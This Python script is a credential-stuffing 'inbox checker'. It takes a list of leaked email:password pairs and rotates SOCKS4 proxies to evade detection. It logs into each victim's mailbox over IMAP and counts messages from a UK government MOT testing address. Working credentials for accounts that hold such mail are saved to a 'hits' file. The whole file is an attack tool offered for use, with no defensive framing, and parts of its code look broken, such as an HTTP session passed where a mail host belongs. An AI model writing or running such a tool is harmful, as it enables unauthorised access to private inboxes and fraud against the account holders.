import asyncio
import aioimaplib
import aiohttp
import socks
import socket

async def read_email_pass_pairs():
    with open('email_pass_log.txt', 'r', encoding='utf-8') as f:
        lines = f.readlines()
    return [line.strip().split(':') for line in lines]

async def read_socks4_proxies():
    with open('proxy_hit.txt', 'r', encoding='utf-8') as f:
        return [line.strip() for line in f.readlines()]

async def set_proxy(proxy):
    if proxy:
        socks.set_default_proxy(socks.SOCKS4, proxy.split(':')[0], int(proxy.split(':')[1]))
        socket.socket = socks.socksocket
    else:
        socks.set_default_proxy()

async def search_emails_from_address(session, email_address, password, target_email):
    try:
        mail = aioimaplib.IMAP4_SSL(session)
        await mail.wait_hello_from_server()
        await mail.login(email_address, password)
        await mail.select("inbox")
        status, messages = await mail.search(None, f'FROM "{target_email}"')

        if status == "OK":
            message_numbers = messages[0].split()
            return len(message_numbers) if message_numbers else 0
        else:
            return None
    except Exception as e:
        print(f"Error with {email_address}: {e}")
        return None

async def main():
    email_pass_pairs = await read_email_pass_pairs()
    socks4_proxies = await read_socks4_proxies()
    target_email = 'Info@mot-testing.service.gov.uk'
    output_file_path = 'hits_log.txt'

    hit_count = 0
    failed_count = 0
    not_found_count = 0

    async with aiohttp.ClientSession() as session:
        for email_address, password in email_pass_pairs:
            for proxy in socks4_proxies:
                try:
                    await set_proxy(proxy)
                    result = await search_emails_from_address(session, email_address, password, target_email)
                    if result is not None:
                        if result > 0:
                            hit_count += 1
                            with open(output_file_path, 'a', encoding='utf-8') as hit_file:
                                hit_file.write(f"{email_address}:{password} - {result} emails found\n")
                            print(f"Found {result} email(s) from {target_email} in {email_address}")
                        else:
                            not_found_count += 1
                            print(f"No emails from {target_email} found in {email_address}")
                    else:
                        failed_count += 1
                except Exception:
                    print(f"Switched to the next proxy due to an error with {email_address}.")
                    failed_count += 1

    print(f"Total hits: {hit_count}")
    print(f"Total failed checks: {failed_count}")
    print(f"Total target inbox not found: {not_found_count}")

if __name__ == "__main__":
    asyncio.run(main())
